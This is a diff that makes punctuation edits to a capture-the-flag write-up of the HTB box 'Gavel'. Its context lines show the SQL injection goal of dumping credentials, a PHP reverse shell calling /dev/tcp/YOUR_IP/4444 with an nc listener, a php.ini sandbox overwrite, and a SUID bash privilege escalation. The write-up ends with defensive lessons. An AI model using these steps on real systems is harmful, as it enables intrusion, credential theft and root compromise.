@@ -4,7 +4,7 @@ date: 2025-10-12
 tags: [linux, web, sqli, git-dumper, php, rce, yaml, suid, privesc]
 difficulty: medium
 platform: HTB
-description: "Linux web box — exposed .git repo leaks PHP source revealing a SQLi, admin panel RCE via PHP rule engine, then privesc by abusing a root-run auction daemon that executes YAML-defined PHP rules."
+description: "Linux web box: exposed .git repo leaks PHP source revealing a SQLi, admin panel RCE via PHP rule engine, then privesc by abusing a root-run auction daemon that executes YAML-defined PHP rules."
 featured: false
 ---
 
@@ -45,7 +45,7 @@ echo "<ip> gavel.htb" | sudo tee -a /etc/hosts
 nmap -p- -sC -sV gavel.htb
 ```
 
-![nmap — ports 22 and 80 open](/images/writeups/gavel/nmap.png)
+![nmap: ports 22 and 80 open](/images/writeups/gavel/nmap.png)
 
 Two ports: 22 (SSH) and 80 (HTTP). All attack surface is on the web app.
 
@@ -65,9 +65,9 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
 ```
 
 Key finds:
-- `/admin.php` — admin dashboard (requires auth)
-- `/inventory.php` — user inventory
-- `/.git/` — exposed Git repository
+- `/admin.php`: admin dashboard (requires auth)
+- `/inventory.php`: user inventory
+- `/.git/`: exposed Git repository
 
 ### Dumping the Git Repository
 
@@ -109,7 +109,7 @@ By studying the code directly, you understand:
 
 - **The backtick handling**: The code tries to sanitize `$sortItem` by removing backticks (`str_replace("`", "", $sortItem)`), but this only protects the sort column, **not** the `user_id`.
 
-- **The logic flow**: Depending on the `sort` parameter, different SQL queries fire — but both are vulnerable because `$userId` ultimately gets injected into the WHERE clause without proper escaping.
+- **The logic flow**: Depending on the `sort` parameter, different SQL queries fire, but both are vulnerable because `$userId` ultimately gets injected into the WHERE clause without proper escaping.
 
 Now, let's hop on back to `gavel.htb` and make an account to play around with `/inventory.php`
 
@@ -123,7 +123,7 @@ Now, let's hop on back to `gavel.htb` and make an account to play around with `/
 
 ### Crafting the SQL Injection Payload
 
-Now that you understand the vulnerability from reading the source code, it's time to exploit it. The goal is to dump the user credentials from the database — specifically targeting the `users` table where usernames and password hashes are stored.
+Now that you understand the vulnerability from reading the source code, it's time to exploit it. The goal is to dump the user credentials from the database, specifically targeting the `users` table where usernames and password hashes are stored.
 
 The payload you'll craft looks like this:
 
@@ -175,7 +175,7 @@ The database executes your subquery, pulls credentials, and displays them in the
 
 Go to your browser and put the URL with the SQLi in. The database executes the subquery and returns credentials in the page:
 
-![SQLi successful — auctioneer hash dumped](/images/writeups/gavel/sqli-succ.png)
+![SQLi successful: auctioneer hash dumped](/images/writeups/gavel/sqli-succ.png)
 
 The hash is bcrypt (`$2y$` prefix).
 
@@ -201,7 +201,7 @@ In the edit rule field, paste a reverse shell:
 system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); return true;
 ```
 
-The page refreshes every second — paste quickly and click Edit. Set up your listener:
+The page refreshes every second. Paste quickly and click Edit. Set up your listener:
 
 ```bash
 nc -lvnp 4444
@@ -221,15 +221,15 @@ su auctioneer  # use the cracked password
 
 ---
 
-## Privilege Escalation — YAML Rule Engine
+## Privilege Escalation: YAML Rule Engine
 
 In `/opt/gavel/` there's a `sample.yaml` showing how the auction daemon works:
 
 ![sample.yaml](/images/writeups/gavel/sample-yaml.png)
 
-The daemon runs as root and evaluates the `rule` field as PHP. The config at `/opt/gavel/.config/php/php.ini` restricts `system()` via `disable_functions` — but we can overwrite it using the same rule engine.
+The daemon runs as root and evaluates the `rule` field as PHP. The config at `/opt/gavel/.config/php/php.ini` restricts `system()` via `disable_functions`, but we can overwrite it using the same rule engine.
 
-### Step 1 — Remove PHP Restrictions
+### Step 1: Remove PHP Restrictions
 
 Create a YAML that overwrites `php.ini`:
 
@@ -253,7 +253,7 @@ cat /opt/gavel/.config/php/php.ini
 # disable_functions= and open_basedir= should now be empty
 ```
 
-### Step 2 — Create SUID bash
+### Step 2: Create SUID bash
 
 ```bash
 cat << 'EOF' > rootshell.yaml
@@ -289,11 +289,11 @@ id
 
 ## Lessons Learned
 
-- Never expose `.git/` in production — the entire source history is recoverable with git-dumper
-- Dynamic column injection bypasses PDO prepared statements — parameterization only protects values, not identifiers
+- Never expose `.git/` in production, the entire source history is recoverable with git-dumper
+- Dynamic column injection bypasses PDO prepared statements, parameterization only protects values, not identifiers
 - "Rule engines" that execute user-controlled strings are RCE primitives; treat them accordingly
 - php.ini sandboxing is only effective if the config file itself is unwritable
-- SUID copies of `/bin/bash` are a one-step persistent root escalation — audit for them regularly
+- SUID copies of `/bin/bash` are a one-step persistent root escalation, audit for them regularly
 
 ## References
 
